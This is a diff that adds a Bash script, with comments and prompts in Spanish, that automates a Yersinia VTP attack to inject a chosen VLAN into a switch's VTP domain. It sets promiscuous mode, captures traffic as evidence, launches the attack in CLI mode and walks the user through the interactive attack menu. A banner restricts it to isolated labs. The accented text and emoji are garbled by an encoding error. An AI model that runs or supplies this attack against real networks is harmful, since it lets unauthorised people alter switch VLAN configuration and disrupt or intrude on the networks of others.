@@ -1,0 +1,84 @@
+#!/bin/bash
+# =============================================
+# Script para agregar VLAN vÃƒÂ­a VTP con Yersinia
+# Solo para laboratorio aislado
+# =============================================
+
+clear
+echo "======================================================"
+echo "     AGREGAR VLAN vÃƒÂ­a VTP - Yersinia"
+echo "     Solo uso en entorno de laboratorio"
+echo "======================================================"
+
+# Verificar root
+if [ "$(id -u)" -ne 0 ]; then
+    echo "Ã¢Å’ Ejecuta el script con sudo: sudo $0"
+    exit 1
+fi
+
+# ConfiguraciÃƒÂ³n
+read -p "Ingresa la interfaz de red (ej: eth0, enp0s3): " INTERFAZ
+read -p "ID de la VLAN a agregar: " VLAN_ID
+read -p "Nombre de la VLAN: " VLAN_NAME
+
+# Validaciones bÃƒÂ¡sicas
+if [[ -z "$INTERFAZ" || -z "$VLAN_ID" ]]; then
+    echo "Ã¢Å’ Interfaz e ID de VLAN son obligatorios."
+    exit 1
+fi
+
+echo -e "\nÃ°Å¸â€Â§ Activando modo promiscuo en $INTERFAZ..."
+ip link set "$INTERFAZ" promisc on
+
+echo -e "\nÃ°Å¸â€œÂ¡ Iniciando captura tcpdump (evidencia)..."
+TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
+PCAP="/tmp/vtp_add_${VLAN_ID}_${TIMESTAMP}.pcap"
+
+tcpdump -i "$INTERFAZ" -w "$PCAP" -nn "vtp or ether proto 0x2003" 2>/dev/null &
+TCPDUMP_PID=$!
+
+sleep 2
+
+echo -e "\nÃ°Å¸Å¡â‚¬ Lanzando ataque para agregar VLAN $VLAN_ID ($VLAN_NAME)..."
+
+# OpciÃƒÂ³n 1: Ataque CLI (rÃƒÂ¡pido pero menos confiable)
+echo "Intentando ataque automÃƒÂ¡tico (Attack 3)..."
+yersinia vtp -interface "$INTERFAZ" -attack 3
+
+sleep 4
+
+# OpciÃƒÂ³n 2: Recomendada - Modo Interactivo
+echo -e "\nÃ¢Å¡ Ã¯Â¸  Ahora se abrirÃƒÂ¡ Yersinia en modo interactivo (mÃƒÂ¡s efectivo)."
+echo "Pasos dentro de Yersinia:"
+echo "   1. Selecciona 'VTP' con las flechas Ã¢â€ â€˜Ã¢â€ â€œ"
+echo "   2. Presiona 'x' para ver las opciones de ataque"
+echo "   3. Elige Attack 3 Ã¢â€ â€™ Add one VLAN"
+echo "   4. Ingresa VLAN ID: $VLAN_ID"
+echo "   5. Ingresa VLAN Name: $VLAN_NAME"
+echo "   6. Ejecuta el ataque"
+echo "   7. Cierra con 'q'"
+
+read -p "Ã‚Â¿Quieres abrir Yersinia ahora? (s/n): " ABRIR
+
+if [[ "$ABRIR" =~ ^[Ss]$ ]]; then
+    yersinia -I
+fi
+
+# Detener captura
+echo -e "\nÃ°Å¸â€ºâ€˜ Deteniendo captura..."
+kill $TCPDUMP_PID 2>/dev/null
+sleep 1
+
+echo -e "\nÃ¢Å“â€¦ Ã‚Â¡Listo!"
+echo "Evidencia guardada en: $PCAP"
+echo ""
+echo "Verifica en el switch con:"
+echo "   show vlan brief"
+echo "   show vtp status"
+echo "   show vtp counters"
+
+echo -e "\nÃ‚Â¿Quieres abrir Wireshark con la captura? (s/n)"
+read -p "" ABRIR_WIRESHARK
+if [[ "$ABRIR_WIRESHARK" =~ ^[Ss]$ ]]; then
+    wireshark "$PCAP" &
+fi
